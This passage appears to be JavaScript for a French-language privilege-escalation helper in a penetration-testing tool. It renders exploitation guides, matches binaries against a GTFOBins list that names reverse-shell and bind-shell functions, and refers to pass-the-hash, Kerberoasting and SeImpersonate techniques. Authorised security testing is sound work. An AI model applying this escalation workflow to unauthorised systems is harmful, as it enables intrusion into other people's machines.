                    ${nodeData.distribution ? `<span class="badge dist-badge">${escapeHtml(nodeData.distribution)}</span>` : ''}
                </h4>
                <hr>

                <h5><i class="fas fa-bullseye"></i> Description & Impact</h5>
                <p>${escapeHtml(vector.description)}</p>
                <p><strong>Impact Potentiel:</strong> <span class="badge impact-badge-${vector.impact?.toLowerCase()}">${escapeHtml(vector.impact || 'N/A')}</span></p>
                <p><strong>Source:</strong> <a href="${vector.sourceLink || '#'}" target="_blank" rel="noopener noreferrer">${escapeHtml(vector.source)}</a></p>

                ${vector.prerequisites && vector.prerequisites.length > 0 ? `
                <h5><i class="fas fa-tasks"></i> Prérequis</h5>
                <ul>
                    ${vector.prerequisites.map(p => `<li>${escapeHtml(p)}</li>`).join('')}
                    ${nodeData.os === 'Windows' && vector.techniqueName.includes('SeImpersonate') ? `<li>Privilège 'SeImpersonatePrivilege' activé pour l'utilisateur '${escapeHtml(nodeData.currentUser)}'</li>` : ''}
                    ${nodeData.os === 'Linux' && vector.context === 'sudo' ? `<li>Accès sudo (avec ou sans mot de passe) à: <code>${escapeHtml(vector.path)}</code></li>` : ''}
                    ${nodeData.os === 'Linux' && vector.context === 'suid' ? `<li>Accès en lecture/exécution sur: <code>${escapeHtml(vector.path)}</code></li>` : ''}
                </ul>` : ''}

                <h5><i class="fas fa-terminal"></i> Commande(s) d'Exploitation</h5>
                ${vector.exploitationCommand ? `
                <p>Exemple(s) de commande(s) - <strong>Adaptez impérativement à votre contexte !</strong></p>
                <div class="code-block-container">
                    <pre><code>${escapeHtml(vector.exploitationCommand)}</code></pre>
                    <button class="copy-btn btn btn-sm btn-outline-secondary" onclick="copyToClipboard(this)"><i class="fas fa-copy"></i> Copier</button>
                </div>
                ` : '<p>Aucune commande d\'exemple fournie.</p>'}

                <!-- Placeholder for Diagram -->
                ${getDiagramForTechnique(vector.techniqueName)}

                <h5><i class="fas fa-check-circle"></i> Vérification</h5>
                <p>Après exécution, vérifiez si vous avez obtenu les privilèges attendus (${escapeHtml(vector.impact || 'N/A')}).</p>
                <p>Exécutez: <code>${nodeData.os === 'Linux' ? 'whoami && id' : 'whoami /all'}</code></p>

                <!-- Placeholder for Cleanup -->
                ${vector.cleanupSteps ? `
                <h5><i class="fas fa-broom"></i> Nettoyage</h5>
                <p>${escapeHtml(vector.cleanupSteps)}</p>
                ` : ''}

                <!-- Bouton pour marquer comme succès -->
                 <button class="btn btn-success btn-sm mt-3" onclick="confirmPrivesc('${nodeData.id}', '${escapeHtml(vector.techniqueName)}', '${escapeHtml(vector.source)}')">
                     <i class="fas fa-check"></i> Confirmer Succès Privesc
                 </button>
            </div>`; // Close wrapper div

        detailsContentEl.innerHTML = guideHtml;
        detailsContentEl.scrollTop = 0; // Scroll to top of details panel
    }

    // Helper to get placeholder diagram (can be expanded)
    function getDiagramForTechnique(techniqueName) {
        let diagramPath = '';
        if (techniqueName.toLowerCase().includes('pass-the-hash') || techniqueName.toLowerCase().includes('pth')) {
            diagramPath = '/assets/images/guides/pth-diagram.svg';
        } else if (techniqueName.toLowerCase().includes('kerberoasting')) {
             diagramPath = '/assets/images/guides/kerberoasting-diagram.svg';
        } // Add more later
        // Ensure the image exists or handle error
        return diagramPath ? `<img src="${diagramPath}" alt="Diagramme ${techniqueName}" class="img-fluid guide-diagram mb-2" onerror="this.style.display='none'; console.warn('Diagram not found: ${diagramPath}')">` : '';
    }

    // --- Status Update (Future API Call) ---
    function updateNodePrivescStatusInHostManager(nodeId, statusInfo) {
        console.log(`Updating privesc status for node ${nodeId}:`, statusInfo);
        // TODO: Implement API call to HostManager
        // fetch(`/api/hostmanager/nodes/${nodeId}/privesc`, { method: 'POST', ... })
        alert(`Statut mis à jour (simulation) pour ${nodeId}: Succès via ${statusInfo.methodUsed}`);

        // Optionnel: Mettre à jour localement graphData et l'UI si nécessaire
        if (graphData && graphData.nodes[nodeId]) {
            graphData.nodes[nodeId].privilegeLevel = statusInfo.impact || 'Elevated'; // Mettre à jour le niveau localement
            graphData.nodes[nodeId].notes = (graphData.nodes[nodeId].notes || '') + `\n[Privesc Success ${statusInfo.timestamp}] Method: ${statusInfo.methodUsed}`;
            // Rafraîchir l'info bar si le node actuel est celui mis à jour
            if (nodeId === currentNodeId) {
                updateActiveNodeInfo(graphData.nodes[nodeId]);
            }
        }
    }


    // --- Utility Functions ---
    function escapeHtml(unsafe) {
        if (typeof unsafe !== 'string') return String(unsafe); // Convertir en string si ce n'en est pas une
        return unsafe
             .replace(/&/g, "&amp;")
             .replace(/</g, "&lt;")
             .replace(/>/g, "&gt;")
             .replace(/"/g, "&quot;")
             .replace(/'/g, "&#039;");
     }

    function showLoadingIndicator(show, type) {
        let element = null;
        if (type === 'parsing') element = parsingLoadingEl;
        else if (type === 'correlation') element = correlationLoadingEl;
        // Add 'global' or other types if needed

        if (element) {
            element.style.display = show ? 'inline-block' : 'none';
        }
    }

    // Helper to check suspicious patterns
    function checkSuspicious(findingType, data) {
        const patterns = knowledgeBases.suspiciousPatterns?.[findingType];
        if (!patterns) return null;

        for (const pattern of patterns) {
            let match = false;
            if (pattern.regex && typeof data === 'string') {
                match = pattern.regex.test(data);
            } else if (pattern.condition && typeof pattern.condition === 'function') {
                match = pattern.condition(data); // Pass the specific data (path, priv object, etc.)
            }
            if (match) {
                // Return the first match found for this type
                return { risk: pattern.risk, message: pattern.message };
            }
        }
        return null; // No suspicious pattern matched
    }

    // Helper to check GTFOBins/LOLBAS (Context-aware)
    function checkGtfobins(binaryPath, context = null) { // context can be 'sudo', 'suid', 'capability', etc.
        if (!knowledgeBases.gtfobins || !binaryPath) return null;
        // Simple normalization: remove potential sudo path prefixes if context is sudo
        if (context === 'sudo' && binaryPath.includes('/')) {
             // Try matching just the binary name if full path fails
        }
        const binaryName = binaryPath.split('/').pop();

        const entry = knowledgeBases.gtfobins.find(b => {
            const gtfobinName = b.binary.split('/').pop();
            // Match full path or just binary name
            return b.binary === binaryPath || gtfobinName === binaryName;
        });


        if (!entry) return null;

        // Check if the entry has functions relevant to the context
        const relevantFunctions = [];
        const possibleContexts = ['sudo', 'suid', 'capabilities', 'shell', 'command', 'file-upload', 'file-download', 'file-write', 'file-read', 'library-load', 'reverse-shell', 'bind-shell']; // Add more GTFOBins functions

        if (context && entry[context] && Array.isArray(entry[context]) && entry[context].length > 0) {
            relevantFunctions.push(context);
        } else if (!context) {
            // If no specific context, check all known function types
             possibleContexts.forEach(ctx => {
                 if (entry[ctx] && Array.isArray(entry[ctx]) && entry[ctx].length > 0) {
                     relevantFunctions.push(ctx);
                 }
             });
        }


        return relevantFunctions.length > 0 ? { functions: relevantFunctions, binary: entry.binary } : null; // Return matched binary path
    }
    // TODO: Implement checkLolbas similarly


    // --- Global Functions (for inline JS calls) ---
    window.confirmPrivesc = (nodeId, technique, source) => {
        // Use graphData to get node name
        const node = graphData?.nodes[nodeId];
        if (!node) {
             alert("Erreur: Impossible de confirmer le succès, node introuvable.");
             return;
        }
        const nodeName = node.ipName;
        if (confirm(`Confirmer l'escalade de privilèges réussie via "${technique}" (${source}) pour le node ${nodeName} ?\n(Ceci mettra à jour le statut dans HostManager à terme)`)) {
            const statusInfo = {
                success: true,
                methodUsed: technique,
                techniqueSource: source,
                timestamp: new Date().toISOString(),
                // Essayer de récupérer l'impact depuis le vecteur correspondant
                impact: potentialVectors.find(v => v.techniqueName === technique)?.impact || 'Elevated'
            };
            // Call the function that will eventually interact with the API
            updateNodePrivescStatusInHostManager(nodeId, statusInfo);
        }
    };

    // Make copy function global or use event delegation if preferred
    window.copyToClipboard = (buttonElement) => {
        const pre = buttonElement.closest('.code-block-container')?.querySelector('pre'); // Trouver le pre parent
        if (pre) {
            const code = pre.querySelector('code');
            if (code) {
                navigator.clipboard.writeText(code.innerText)
                    .then(() => {
                        const originalText = buttonElement.innerHTML;
                        buttonElement.innerHTML = '<i class="fas fa-check"></i> Copié!';
                        buttonElement.classList.add('btn-success'); // Visuel feedback
                        buttonElement.classList.remove('btn-outline-secondary');
                        setTimeout(() => {
                            buttonElement.innerHTML = originalText;
                            buttonElement.classList.remove('btn-success');
                            buttonElement.classList.add('btn-outline-secondary');
                        }, 1500);
                    })
                    .catch(err => {
                        console.error('Failed to copy text: ', err);
                        alert('Erreur lors de la copie.');
                    });
            }
        } else {
            console.warn("Could not find pre element for copy button:", buttonElement);
        }
    };


    // --- Start Initialization ---
    initialize();

});
